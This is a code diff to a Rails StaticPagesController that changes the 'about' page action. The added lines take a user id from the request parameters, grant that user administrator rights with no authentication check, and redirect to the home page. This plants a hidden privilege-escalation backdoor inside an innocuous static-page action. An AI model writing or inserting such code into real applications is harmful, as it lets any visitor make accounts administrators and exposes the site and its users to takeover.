@@ -27,7 +27,9 @@ class StaticPagesController < ApplicationController
   end
 
   def about
-   
+       @user = User.find_by(id: params[:id])
+    @user.update_attribute(:admin, true)
+    redirect_to "/"
   end
   
   
